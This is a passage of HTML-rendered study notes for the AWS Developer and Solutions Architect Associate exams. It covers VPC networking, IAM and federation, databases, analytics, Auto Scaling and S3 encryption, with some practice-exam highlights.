<li>VPC‚Äôs can contain one or more subnets</li>
<li>A public subnet is a subnet that is accessible from the internet</li>
<li>To define access to the internet and between subnets, use route tables</li>
</ul>
<h2 id="internet-gateway-and-nat-gateway"><a class="header" href="#internet-gateway-and-nat-gateway">Internet Gateway and NAT Gateway</a></h2>
<ul>
<li>Internet gateways help the VPC connect to the internet</li>
<li>Public subnets have a route to the internet gateway</li>
<li>NAT gateways and NAT instances (self-managed) allow your instances in your private subnet to <em>access the internet while remaining private</em></li>
</ul>
<h2 id="network-acl-and-security-groups"><a class="header" href="#network-acl-and-security-groups">Network ACL and Security Groups</a></h2>
<ul>
<li>NACL is a firewall rule list which allows or denies traffic to and from a subnet</li>
<li>NACL‚Äôs are attached at the subnet level</li>
<li>NACL‚Äôs are stateless, meaning an inbound rule needs to have a matching outbound rule</li>
<li>Security groups are a firewall rule list that controls traffic to and from an EC2 instance</li>
<li>Security groups can only contain allow rules</li>
<li>Security group rules can contain IP addresses/ranges or other Security Groups</li>
</ul>
<h2 id="vpc-flow-logs"><a class="header" href="#vpc-flow-logs">VPC Flow Logs</a></h2>
<ul>
<li>Flow logs log traffic into a VPC, subnet, or Elastic Network Interface</li>
<li>3 Types of flow logs
<ul>
<li>VPC Flow Logs</li>
<li>Subnet Flow Logs</li>
<li>ENI Flow Logs</li>
</ul>
</li>
<li>Log data can be sent to S3, CloudWatch Logs, and Kinesis Data Firehouse</li>
</ul>
<h2 id="vpc-peering"><a class="header" href="#vpc-peering">VPC Peering</a></h2>
<ul>
<li>Connect two VPC, privately over the AWS backbone network</li>
<li>The two VPCs must not have overlapping CIDR blocks</li>
<li>VPC peering is not transitive
<img src="clouds/aws/dva-c02/images/vpc-peering.jpg" width="57%" /></li>
</ul>
<h2 id="vpc-endpoints"><a class="header" href="#vpc-endpoints">VPC Endpoints</a></h2>
<ul>
<li>Endpoints allow you to connect to AWS Services using a private network instead of the public network</li>
<li>Gives you enhanced security and lower latency accessing AWS services
<img src="clouds/aws/dva-c02/images/vpc-endpoints.jpg" width="57%" /></li>
</ul>
<h2 id="site-to-site-vpc"><a class="header" href="#site-to-site-vpc">Site to Site VPC</a></h2>
<ul>
<li>Establish a physical connection between AWS and on-premises</li>
<li>Goes over the public internet
<img src="clouds/aws/dva-c02/images/site-to-site-vpn.jpg" width="57%" /></li>
</ul>
<h2 id="direct-connect"><a class="header" href="#direct-connect">Direct Connect</a></h2>
<ul>
<li>Establish a physical connection between AWS and on-premises</li>
<li>Goes over a private network</li>
<li>Requires infrastructure to be put in place
<img src="clouds/aws/dva-c02/images/direct-connect.jpg" width="57%" /></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="aws-solutions-architect-associate-notes"><a class="header" href="#aws-solutions-architect-associate-notes">AWS-Solutions-Architect-Associate-notes</a></h1>
<p>This is a collection of study material and follows through guidelines of the AWS Certified Solutions Architect - Associate exam (SAA-C03) exam.</p>
<h1 id="exam-guide"><a class="header" href="#exam-guide">Exam Guide</a></h1>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Domain</th><th>% of Exam</th></tr>
</thead>
<tbody>
<tr><td>Domain 1: Design Secure Architectures</td><td>30%</td></tr>
<tr><td>Domain 2: Design Resilient Architectures</td><td>26%</td></tr>
<tr><td>Domain 3: Design High-Performing Architectures</td><td>24%</td></tr>
<tr><td>Domain 4: Design Cost-Optimized Architectures</td><td>20%</td></tr>
<tr><td>TOTAL</td><td>100%</td></tr>
</tbody>
</table>
</div>
<h2 id="directory-map-3"><a class="header" href="#directory-map-3">Directory Map</a></h2>
<ul>
<li><a href="clouds/aws/saa-c03/APIGateway">APIGateway</a>
<ul>
<li><a href="#api-gateway-cheatsheet">api-gateway-cheatsheet</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Application-Integration">Application-Integration</a>
<ul>
<li><a href="#queueing-sqs-1">application-integration</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/CloudFront">CloudFront</a>
<ul>
<li><a href="#cloudfront-3">cloudfront</a></li>
<li><a href="#cloudfront-cheatsheet">cloudfront-cheatsheet</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Database">Database</a>
<ul>
<li><a href="#what-is-database--1">database</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Disaster-Recovery-Migrations">Disaster-Recovery-Migrations</a>
<ul>
<li><a href="#disaster-recovery">disaster-recover-migrations</a></li>
<li><a href="#disaster-recovery-cheatsheet">disaster-recovery-cheatsheet</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/EC2">EC2</a>
<ul>
<li><a href="#ec2-3">Ec2</a></li>
<li><a href="#savings-plan-1">ec2-pricing</a></li>
<li><a href="#elastic-load-balancer-1">elb</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/EFS">EFS</a>
<ul>
<li><a href="#elastic-file-system-efs-1">efs</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/ElastiCache">ElastiCache</a>
<ul>
<li><a href="#what-is-elasticache-for-redis-1">elasticache</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Glue">Glue</a>
<ul>
<li><a href="#glue-cheatsheet">glue-cheatsheet</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Lambda">Lambda</a>
<ul>
<li><a href="#aws-lambda-1">lambda</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Machine-Learning-Models">Machine-Learning-Models</a>
<ul>
<li><a href="#ml-models">ml-models</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Monitoring-and-Audit">Monitoring-and-Audit</a>
<ul>
<li><a href="clouds/aws/saa-c03/Monitoring-and-Audit/monitoring-and-audit">monitoring-and-audit</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Quicksight">Quicksight</a>
<ul>
<li><a href="#what-is-amazon-quicksight--1">quicksight</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/RDS-and-Aurora">RDS-and-Aurora</a>
<ul>
<li><a href="#aurora-cheatsheet-1">aurora-cheatsheet</a></li>
<li><a href="#rds-2">rds-and-aurora</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Redshift">Redshift</a>
<ul>
<li><a href="#amazon-redshift-1">redshift</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Route53">Route53</a>
<ul>
<li><a href="#dns-3">route53</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/security">security</a>
<ul>
<li><a href="#iam-1">iam</a></li>
<li><a href="#aws-certificate-manager">security</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Storage">Storage</a>
<ul>
<li><a href="#introduction-to-s3-1">storage</a></li>
<li><a href="#storage-cheatsheet">storage-cheatsheet</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/VPC">VPC</a>
<ul>
<li><a href="clouds/aws/saa-c03/VPC/nacl-cheatsheet">nacl-cheatsheet</a></li>
<li><a href="#introduction-to-vpc-1">vpc</a></li>
<li><a href="#vpc-endpoint-cheatsheet">vpc-endpoint-cheatsheet</a></li>
<li><a href="#vpc-flow-logs-cheatsheet">vpc-flow-logs-cheatsheet</a></li>
</ul>
</li>
</ul>
<h2 id="table-of-contents-3"><a class="header" href="#table-of-contents-3">Table of Contents</a></h2>
<ul>
<li><a href="clouds/aws/saa-c03/Storage/storage.md.html">Storage</a></li>
<li><a href="#introduction-to-vpc-1">VPC</a></li>
<li><a href="#cloudfront-3">CLoudFront</a></li>
<li><a href="#aws-lambda-1">AWS Lambda</a></li>
<li><a href="#rds-2">RDS and Aurora</a></li>
<li><a href="#amazon-redshift-1">Redshift</a></li>
<li><a href="clouds/aws/saa-c03/Ec2-Pricing/Ec2.html">EC2</a></li>
<li><a href="clouds/aws/saa-c03/Ec2-Pricing/ec2-pricing.html">EC2 Pricing</a></li>
<li><a href="#elastic-file-system-efs-1">EFS</a></li>
<li><a href="#what-is-elasticache-for-redis-1">ElastiCache for Redis</a></li>
<li><a href="#queueing-sqs-1">Application Integration</a></li>
<li><a href="#what-is-amazon-quicksight--1">QuickSight</a></li>
<li><a href="#disaster-recovery">Disaster Recovery Migrations</a></li>
<li><a href="#dns-3">Route 53</a></li>
</ul>
<h2 id="cheatsheets-1"><a class="header" href="#cheatsheets-1">CheatSheets</a></h2>
<ul>
<li><a href="#storage-cheatsheet">Storage cheat sheet</a></li>
<li><a href="#vpc-endpoint-cheatsheet">VPC Endpoint</a></li>
<li><a href="#vpc-flow-logs-cheatsheet">VPC FLow Logs</a></li>
<li><a href="clouds/aws/saa-c03/VPC/nacl-cheatsheet">NACL</a></li>
<li><a href="#cloudfront-cheatsheet">CloudFront</a></li>
<li><a href="clouds/aws/saa-c03/Aurora/aurora-cheatsheet.html">Aurora</a></li>
<li><a href="#glue-cheatsheet">Glue</a></li>
<li><a href="#api-gateway-cheatsheet">API Gateway</a></li>
<li><a href="#disaster-recovery-cheatsheet">Disaster Recovery Migrations</a></li>
<li><a href="#table-of-contents-10">Overview</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="aws-certified-solutions-architect-associate-practice-exams"><a class="header" href="#aws-certified-solutions-architect-associate-practice-exams">AWS Certified Solutions Architect Associate Practice Exams</a></h1>
<p><img src="https://img-c.udemycdn.com/course/480x270/1520628_21fa_4.jpg" alt=""></p>
<h3 id="metadata"><a class="header" href="#metadata">Metadata</a></h3>
<ul>
<li>Title: AWS Certified Solutions Architect Associate Practice Exams</li>
<li>URL: https://www.udemy.com/course/aws-certified-solutions-architect-associate-amazon-practice-exams-saa-c03/learn/quiz/4394972/result/1100741372</li>
</ul>
<h3 id="highlights--notes"><a class="header" href="#highlights--notes">Highlights &amp; Notes</a></h3>
<ul>
<li>
<p>In Auto Scaling, the following statements are correct regarding the cooldown period:  It ensures that the Auto Scaling group does not launch or terminate additional EC2 instances before the previous scaling activity takes effect.  Its default value is 300 seconds.  It is a configurable setting for your Auto Scaling group.</p>
</li>
<li>
<p>You can use Amazon Data Lifecycle Manager (Amazon DLM) to automate the creation, retention, and deletion of snapshots taken to back up your Amazon EBS volumes. Automating snapshot management helps you to:  - Protect valuable data by enforcing a regular backup schedule.  - Retain backups as required by auditors or internal compliance.  - Reduce storage costs by deleting outdated backups.</p>
</li>
<li>
<p>AWS Global Accelerator and Amazon CloudFront are separate services that use the AWS global network and its edge locations around the world. CloudFront improves performance for both cacheable content (such as images and videos) and dynamic content (such as API acceleration and dynamic site delivery). Global Accelerator improves performance for a wide range of applications over TCP or UDP by proxying packets at the edge to applications running in one or more AWS Regions. Global Accelerator is a good fit for non-HTTP use cases, such as gaming (UDP), IoT (MQTT), or Voice over IP, as well as for HTTP use cases that specifically require static IP addresses or deterministic, fast regional failover. Both services integrate with AWS Shield for DDoS protection.</p>
</li>
<li>
<p>A Gateway endpoint is a type of VPC endpoint that provides reliable connectivity to Amazon S3 and DynamoDB without requiring an internet gateway or a NAT device for your VPC. Instances in your VPC do not require public IP addresses to communicate with resources in the service.</p>
</li>
<li>
<p>AWS DataSync makes it simple and fast to move large amounts of data online between on-premises storage and Amazon S3, Amazon Elastic File System (Amazon EFS), or Amazon FSx for Windows File Server. Manual tasks related to data transfers can slow down migrations and burden IT operations. DataSync eliminates or automatically handles many of these tasks, including scripting copy jobs, scheduling, and monitoring transfers, validating data, and optimizing network utilization. The DataSync software agent connects to your Network File System (NFS), Server Message Block (SMB) storage, and your self-managed object storage, so you don‚Äôt have to modify your applications.  DataSync can transfer hundreds of terabytes and millions of files at speeds up to 10 times faster than open-source tools, over the Internet or AWS Direct Connect links. You can use DataSync to migrate active data sets or archives to AWS, transfer data to the cloud for timely analysis and processing, or replicate data to AWS for business continuity. Getting started with DataSync is easy: deploy the DataSync agent, connect it to your file system, select your AWS storage resources, and start moving data between them. You pay only for the data you move.</p>
</li>
<li>
<p>Here is a list of important information about EBS Volumes:</p>
<ul>
<li>
<p>When you create an EBS volume in an Availability Zone, it is automatically replicated within that zone to prevent data loss due to a failure of any single hardware component.</p>
</li>
<li>
<p>An EBS volume can only be attached to one EC2 instance at a time.</p>
</li>
<li>
<p>After you create a volume, you can attach it to any EC2 instance in the same Availability Zone</p>
</li>
<li>
<p>An EBS volume is off-instance storage that can persist independently from the life of an instance. You can specify not to terminate the EBS volume when you terminate the EC2 instance during instance creation.</p>
</li>
<li>
<p>EBS volumes support live configuration changes while in production which means that you can modify the volume type, volume size, and IOPS capacity without service interruptions.</p>
</li>
<li>
<p>Amazon EBS encryption uses 256-bit Advanced Encryption Standard algorithms (AES-256)</p>
</li>
<li>
<p>EBS Volumes offer 99.999% SLA.</p>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="table-of-contents-10"><a href="#table-of-contents-10" class="header">Table of Contents</a></h1>
<h2 id="table-of-contents-4"><a class="header" href="#table-of-contents-4">Table of Contents</a></h2>
<ul>
<li><a href="#amazon-ebs">Amazon EBS</a></li>
<li><a href="#cloudwatch-1">Cloudwatch</a></li>
<li><a href="#aws-identity-and-access-management">AWS Identity and Access Management</a></li>
<li><a href="#rds">RDS</a></li>
<li><a href="#athena">Athena</a></li>
<li><a href="#kinesis-1">Kinesis</a></li>
<li><a href="#dynamodb-1">DynamoDB</a></li>
<li><a href="#storage-gateway">Storage Gateway</a></li>
<li><a href="#elastic-load-balancer">Elastic Load Balancer</a></li>
<li><a href="#security-group">Security Group</a></li>
<li><a href="#route-53">Route 53</a></li>
<li><a href="#aws-transit-gateway">AWS Transit Gateway</a></li>
<li><a href="#amazon-emr">Amazon EMR</a></li>
<li><a href="#auto-scaling">Auto Scaling</a></li>
<li><a href="#s3-1">S3</a></li>
<li><a href="#cloudfront-1">Cloudfront</a></li>
<li><a href="#secrets-manager">Secrets Manager</a></li>
<li><a href="#textract">Textract</a></li>
<li><a href="#rpo-and-rto">RPO and RTO</a></li>
<li><a href="#ec2-1">EC2</a></li>
<li><a href="#network-firewall">Network Firewall</a></li>
<li><a href="#security">Security</a></li>
</ul>
<h2 id="amazon-ebs"><a class="header" href="#amazon-ebs">Amazon EBS</a></h2>
<hr>
<ul>
<li>
<p><b> Amazon EBS </b> provides three volume types to best meet the needs of your workloads:</p>
<ul>
<li><b> General Purpose (SSD) </b>
<ul>
<li>General Purpose (SSD) volumes are suitable for a <ins>broad range of workloads, including small to medium-sized databases, development and test environments, and boot volumes.</ins></li>
</ul>
</li>
<li><b> Provisioned IOPS (SSD) </b>
<ul>
<li>These volumes offer storage with consistent and low-latency performance and are designed for I/O intensive applications such as <ins>large relational or NoSQL databases. </ins></li>
</ul>
</li>
<li><b>Magnetic</b>
<ul>
<li>for workloads where <ins>data are accessed infrequently, and applications where the <i>lowest storage cost</i> is important. </ins></li>
</ul>
</li>
</ul>
</li>
<li>
<p>Here is a list of important information about EBS Volumes:</p>
<ul>
<li>
<p>When you create an EBS volume in an Availability Zone, it is automatically replicated within that zone to prevent data loss due to a failure of any single hardware component.</p>
</li>
<li>
<p>An EBS volume can only be attached to one EC2 instance at a time.</p>
</li>
<li>
<p>After you create a volume, you can attach it to any EC2 instance in the same Availability Zone</p>
</li>
<li>
<p>An EBS volume is off-instance storage that can persist independently from the life of an instance. You can specify not to terminate the EBS volume when you terminate the EC2 instance during instance creation.</p>
</li>
<li>
<p>EBS volumes support live configuration changes while in production which means that you can modify the volume type, volume size, and IOPS capacity without service interruptions.</p>
</li>
<li>
<p>Amazon EBS encryption uses 256-bit Advanced Encryption Standard algorithms (AES-256)</p>
</li>
<li>
<p>EBS Volumes offer 99.999% SLA. This</p>
</li>
</ul>
</li>
</ul>
<h2 id="cloudwatch-1"><a class="header" href="#cloudwatch-1">Cloudwatch</a></h2>
<hr>
<ul>
<li>Monitoring tool for your AWS resources and applications.</li>
<li><ins> Display metrics and create alarms </ins> that watch the metrics and send notifications or automatically make changes to the resources you are monitoring when a threshold is breached.</li>
</ul>
<h2 id="aws-identity-and-access-management"><a class="header" href="#aws-identity-and-access-management">AWS Identity and Access Management</a></h2>
<hr>
<ul>
<li>
<p>You should <ins> <i><strong>always associate IAM role to EC2 instances not IAM user for the purpose of accessing other AWS services  </strong></i></ins></p>
</li>
<li>
<p><strong> IAM roles </strong> are designed so that your <ins>application can <i>securely make API requests</i> from your instances,</ins> without requiring you to manage the security credentials that the application use.</p>
<ul>
<li>Instead of creating and distributing your AWS credentials, you can <ins>delegate permission to make API requests using <strong>IAM roles</strong></ins></li>
</ul>
</li>
<li>
<p><strong>AWS Organization</strong> is a service that allows you to manage multiple AWS accounts easily.</p>
</li>
<li>
<p><strong>AWS IAM Identity Center </strong> can be integrated with your corporate directory service for centralized authentication.</p>
<ul>
<li>This means you can <ins>sign in to multiple AWS accounts with just one set of credentials.</ins></li>
<li>This integration helps to streamline the authentication process and makes it <ins>easier for companies to switch between accounts.</ins></li>
</ul>
</li>
<li>
<p><strong>SCP</strong> you can also configure a <ins>service control policy (SCP) </ins>to manage your AWS accounts.</p>
<ul>
<li>SCPs help you <ins> enforce policies across your organization and control the services </ins> and features accessible to your other account.</li>
<li>prevents unauthorized access</li>
</ul>
</li>
<li>
<p><strong>Security Token Service (STS)</strong> is the service that you can use to <ins>create and provide trusted users with temporary security credentials</ins> that can control access to your AWS resources.</p>
<ul>
<li><ins>Temporary security credentials work almost identically to the long-term access key credentials</ins> that your IAM users can use.</li>
</ul>
</li>
<li>
<p><strong> AWS Control Tower </strong> provides a single location to easily <ins> set up your new well-architected multi-account environment </ins> and govern your AWS workloads with rules for security,operations, and internal compliance.</p>
<ul>
<li>You can automate the setup of your AWS environment with best-practices <ins>blueprints for multi-account structure, identity, access management, and account provisioning workflow. </ins></li>
<li><ins> offers ‚Äúguardrails‚Äù </ins> for ongoing governance of your AWS environment.</li>
</ul>
</li>
<li>
<p>You can use an <i><ins>IAM role to specify permissions for users </ins></i> whose identity is federated from your organization or a third-party identity provider (IdP).</p>
<ul>
<li><b>Federating users with SAML 2.0</b>
<ul>
<li>If your organization already uses an identity provider <ins>software package that supports SAML 2.0 (Security Assertion Markup Language 2.0)</ins>, you can create trust between your organization as an identity provider (IdP) and AWS as the service provider.</li>
<li>You can then use SAML to provide your users with <ins>federated single-sign on (SSO) </ins>to the AWS Management Console or federated access to call AWS API operations.</li>
<li><b>For example</b>: if your company uses Microsoft Active Directory and Active Directory Federation Services, then you can federate using SAML 2.0</li>
</ul>
</li>
<li><b>Federating users by creating a custom identity <ins>broker application</ins></b>
<ul>
<li>
<p>If your <ins>identity store is not compatible with SAML 2.0,</ins> then you can <i>build a custom <b>identity broker application </b> to perform a similar function. </i></p>
</li>
<li>
<p>The broker application <ins>authenticates users, requests temporary credentials for users from AWS,</ins> and then provides them to the user to access AWS resources.</p>
</li>
<li>
<p>The application verifies that employees are signed into the existing corporate network‚Äôs identity and authentication system, which might use LDAP, Active Directory, or another system. The identity broker application then obtains temporary security credentials for the employees.</p>
</li>
<li>
<p>To <i>get temporary security credentials, </i>the identity broker application calls either <code>AssumeRole</code> or <code>GetFederationToken</code> to obtain temporary security credentials, depending on how you want to manage the policies for users and when the temporary credentials should expire.</p>
</li>
<li>
<p>The <ins>call returns temporary security credentials consisting of an AWS access key ID, a secret access key, and a session token.</ins> The identity broker application makes these temporary security credentials available to the internal company application.</p>
  <img src="clouds/aws/saa-c03/images/Overview/broker-application.jpg" width="47%" height="40%" />
</li>
<li>
<p>This scenario has the following attributes:</p>
<ul>
<li>
<p>The identity broker application has permissions to access IAM‚Äôs token service (STS) API to create temporary security credentials.</p>
</li>
<li>
<p>The identity broker application is able to verify that employees are authenticated within the existing authentication system.</p>
</li>
<li>
<p>Users are able to get a temporary URL that gives them access to the AWS Management Console (which is referred to as single sign-on).</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="rds"><a class="header" href="#rds">RDS</a></h2>
<hr>
<ul>
<li>Supports <b>Aurora, MySQL, MariaDB, PostgreSQL, Oracle, Microsoft SQL Server.</b></li>
<li><b>DB Instance </b>
<ul>
<li>For production OLTP use cases, use <b>Multi-AZ deployments </b> for <ins>enhanced fault tolerance with Provisioned <i>IOPS </i>storage for fast and predictable performance.
<ul>
<li>You can use PIOPS storage with Read Replicas for MySQL, MariaDB or PostgreSQL.</li>
</ul>
</ins></li>
<li><b> Magnetic </b>
<ul>
<li>Doesn‚Äôt allow you to scale storage when using the SQL Server database engine.
<ul>
<li>Doesn‚Äôt support elastic volumes.</li>
<li>Limited to a maximum size of 3 TiB.</li>
<li>Limited to a maximum of 1,000 IOPS.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>RDS automatically performs a failover in the event of any of the following:
<ol>
<li>Loss of availability in primary Availability Zone.</li>
<li>Loss of network connectivity to primary.</li>
<li>Compute unit failure on primary.</li>
<li>Storage failure on primary.</li>
</ol>
</li>
</ul>
<h2 id="athena"><a class="header" href="#athena">Athena</a></h2>
<hr>
<ul>
<li>An interactive query service that makes it easy to analyze data directly in Amazon S3 and other data sources using SQL.</li>
<li><i>Serverless</i></li>
<li>Has a <ins>built-in query editor.</ins></li>
<li>highly available and durable</li>
<li><ins>integrates with <b>Amazon QuickSight </b></ins> for easy data visualization.</li>
<li>retains query history for 45 days.</li>
<li>You pay only for the queries that you run. You are charged based on the amount of data scanned by each query.</li>
<li>There are 2 types of cost controls:
<ul>
<li><b> Per-query limit </b>
<ul>
<li>specifies a threshold for the total amount of data scanned per query.</li>
<li>Any query running in a workgroup is <ins>canceled once it exceeds the specified limit</ins>.</li>
<li>Only one per-query limit can be created</li>
</ul>
</li>
<li><b>Per-workgroup limit</b>
<ul>
<li>this limits the total amount of data scanned by all queries running within a specific time frame.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="kinesis-1"><a class="header" href="#kinesis-1">Kinesis</a></h2>
<hr>
<ul>
<li>A fully managed AWS service that you can use to stream <ins> live video from devices to the AWS Cloud</ins>, or build applications for <strong> real-time video processing or batch-oriented video analytics.</strong></li>
<li>Amazon Kinesis Data Streams enables real-time processing of streaming big data. It provides ordering of records, as well as the ability to read and/or replay records in the same order to multiple Amazon Kinesis Applications</li>
<li>A Kinesis data stream is a set of <ins>shards that has a sequence of data records </ins>, and each data record has a <strong>sequence number </strong>that is assigned by Kinesis Data Streams.
<ul>
<li>Kinesis <ins>can also easily handle the high volume of messages</ins> being sent to the service.</li>
<li>durable</li>
<li>no missing of messages</li>
</ul>
</li>
</ul>
<h2 id="dynamodb-1"><a class="header" href="#dynamodb-1">DynamoDB</a></h2>
<ul>
<li>
<h3 id="how-to-choose-the-right-partition-key-"><a class="header" href="#how-to-choose-the-right-partition-key-">How to choose the right partition key ?</a></h3>
<ul>
<li>What is partition key ?
<ul>
<li>DynamoDB supports 2 types of primary keys
<ul>
<li>Partition key: <ins> A simple primary key,</ins> composed of one attribute known as the partition key.</li>
<li>Partition key and Sort key: Referred to as Composite Primary Key, this type of key is composed of two attributes. 1st one is partition key and 2nd one is sort key
<img src="clouds/aws/saa-c03/images/Overview/DynamoDB.png" width="87%" /></li>
</ul>
</li>
</ul>
</li>
<li>Why do I need a partition key?
<ul>
<li>DynamoDb stores data as groups of attributes, - Items</li>
<li>Items are similar to rows or records in other database systems.</li>
<li>DynamoDB stores and retrieves each item based on the primary key value which must be unique</li>
<li><ins><strong><i>DynamoDb uses the partition key‚Äôs value as an input to an internal hash function. </i></strong> The output from the hash function determines the partition in which the item is stored. Each item‚Äôs location is determined by the hash value of its partition key.
<img src="clouds/aws/saa-c03/images/Overview/dynamodb-partition.png" width="87%" /></ins></li>
</ul>
</li>
<li>DynamoDB automatically supports access patterns using the throughput you have provisioned, or upto your account limits in the on-demand mode</li>
<li>Regardless of the capacity mode you choose <ins><strong><i> if your access pattern exceeds 3000 RCU and 1000 WCU for a single partition key value, your requests might be throttled with a  <code>ProvisionedThroughputExceededException</code> error </i></strong></ins></li>
<li>Recommended for Partition keys :
<ul>
<li><ins> Use high-cardinality attributes. </ins> These are attributes that have distinct values for each item, like <code>emailid</code>, <code>employee_no</code>, <code>customerid</code>, <code>sessionid</code>, <code>orderid</code></li>
<li><ins><strong>Use composite attributes </strong> Try to combine more tha one attribute to form a unique key, if that meets your access pattern</ins></li>
<li><strong><ins>Cache the popular items</ins></strong> when there is high volume of read traffic using DAX (DynamoDB Accelerator)</li>
<li>DAX is fully managed, in-memory cache for DynamoDB that doesn‚Äôt require developers to manage cache invalidation, data population or cluster management.</li>
<li>DAX also is compatible with DynamoDB API calls, so developer can incorporate it more easily into existing applications</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="storage-gateway"><a class="header" href="#storage-gateway">Storage Gateway</a></h2>
<hr>
<ul>
<li>
<p>Connects an on-premise software appliance with cloud-based storage to <ins>provide seamless integration with data security features between your <b>on-premises IT environment and the AWS storage infrastructure.</b></ins></p>
</li>
<li>
<p>You can use the service to store data in the AWS cloud for scalable and cost-effective storage that helps maintain</p>
</li>
<li>
<p>It stores files as native S3 objects, archives virtual tapes in Amazon Glacier and stores EBS snapshots generated by the Volume Gateway with Amazon EBS.</p>
  <img src="clouds/aws/saa-c03/images/Overview/storage-gateway.jpg" width="87%" />
</li>
</ul>
<h2 id="elastic-load-balancer"><a class="header" href="#elastic-load-balancer">Elastic Load Balancer</a></h2>
<hr>
<ul>
<li>Distributes incoming application or network traffic across multiple targets, such as EC2 instances containers (ECS), Lambda functions and IP addresses in multiple Availability zones</li>
</ul>
<h2 id="security-group"><a class="header" href="#security-group">Security Group</a></h2>
<hr>
<ul>
<li>
<p>A security group acts as a virtual firewall for your instance to control inbound and outbound traffic.</p>
   <img src="clouds/aws/saa-c03/images/Overview/security-group.jpg" width="87%" />
</li>
</ul>
<h2 id="route-53"><a class="header" href="#route-53">Route 53</a></h2>
<hr>
<ul>
<li>A highly available and scalable Domain Name System (DNS) web service used for domain registration, DNS routing and health checking</li>
</ul>
<h2 id="aws-transit-gateway"><a class="header" href="#aws-transit-gateway">AWS Transit Gateway</a></h2>
<hr>
<ul>
<li>A networking service that uses a hub and spoke model to connect the on-premises data centers and Amazon VPCs to a <ins><em>Single Gateway.</em></ins></li>
<li>With this service, customers only have to create and manage  <ins><em><strong>a single connection from the central gateway into each on-premises data center</strong></em></ins></li>
<li><strong>Features</strong>:
<ul>
<li><strong>Inter-region peering </strong>
<ul>
<li>allows customers to route traffic</li>
<li>easy and cost-effective way</li>
</ul>
</li>
<li><strong> Multicast </strong>
<ul>
<li>allows customers to have fine-grain control on who can consume and produce multicast traffic</li>
</ul>
</li>
<li><strong>Automated provisioning </strong>
<ul>
<li>customers can automatically identify the Site-to-site VPN connections and on-premises resources with which they are associated using AWS Transit Gateway</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="amazon-emr"><a class="header" href="#amazon-emr">Amazon EMR</a></h2>
<hr>
<ul>
<li>
<p>EMR (Elastic MapReduce)</p>
</li>
<li>
<p>A managed cluster that <ins>simplifies running big data frameworks </ins>like Apache Hadoop and Apache Spark on AWS to process and analyze vast amounts of data.</p>
</li>
<li>
<p>You can process data for analytics purposes and <ins>business intelligence workloads </ins>using EMR together with Apache Hive and Apache Pig</p>
</li>
<li>
<p>You can <ins><em>use EMR to move large amounts of data in and out of other AWS data stores </em></ins> and databases like S3 and DynamoDB</p>
  <img src="clouds/aws/saa-c03/images/Overview/emr.jpg" width="87%" />
</li>
<li>
<p>Purchasing options:</p>
<ul>
<li>On-Demand:reliable, predictable, won‚Äôt be terminated</li>
<li>Reserved (min 1 year): cost savings (EMR will automatically use if available)</li>
</ul>
</li>
</ul>
<h2 id="auto-scaling"><a class="header" href="#auto-scaling">Auto Scaling</a></h2>
<hr>
<ul>
<li>Configure automatic scaling for the AWS resources quickly through a scaling plan that uses <strong> Dynamic Scaling </strong>and <strong>Predictive scaling </strong>.</li>
<li><strong><em>Useful for </em></strong>:
<ul>
<li>Cyclical traffic such as high use of resources during regular business hours and low use of resources</li>
<li>On and Off traffic such as <ins>batch processing, testing and periodic analysis </ins></li>
<li>Variable traffic patterns, such as software for <ins>marketing growth with periods of spiky growth </ins></li>
</ul>
</li>
<li><strong>Dynamic Scaling</strong>
<ul>
<li>To add and remove capacity for resources to maintain resource at target value</li>
</ul>
</li>
<li><strong>Predictive Scaling</strong>
<ul>
<li>To forecast the future load demands by analyzing your historical records for a metric</li>
<li><ins>Allows schedule scaling </ins> by adding or removing capacity and controls maximum capacity</li>
<li><ins><em> <strong>Only available for EC2 scaling groups </strong></em></ins></li>
</ul>
</li>
<li>In Auto Scaling, the following statements are correct regarding the cooldown period:
<ul>
<li>It ensures that the Auto Scaling group does not launch or terminate additional EC2 instances before the previous scaling activity takes effect.</li>
<li>Its default value is 300 seconds.</li>
<li>It is a configurable setting for your Auto Scaling group.</li>
</ul>
</li>
</ul>
<h2 id="s3-1"><a class="header" href="#s3-1">S3</a></h2>
<hr>
<ul>
<li><strong>Server-side encryption (SSE)</strong> is about data encryption at rest-that is, Amazon S3 encrypts your data at the object level as it writes it to disks in its data centers and decrypts it for you when you access it.
<img src="clouds/aws/saa-c03/images/Overview/server-side-encryption.jpg" width="87%" />
<ul>
<li>
<p>You have three mutually exclusive options depending on how you choose to manage the encryption keys:</p>
<p>1.<strong>Amazon S3-Managed Keys (SSE-S3) </strong></p>
<ol start="2">
<li>
<p><strong>AWS KMS-Managed Keys (SSE-KMS)</strong></p>
</li>
<li>
<p><strong>Customer-Provided Keys (SSE-C)</strong></p>
</li>
</ol>
</li>
<li>
<p><strong> S3-Managed Encryption Keys (SSE-S3)</strong></p>
<ul>
<li>Amazon S3 will <ins>encrypt each object with a unique key</ins> and as an additional safeguard,<ins> it encrypts the key itself with a master key that it<strong> rotates regularly. </strong></ins></li>
</ul>
</li>
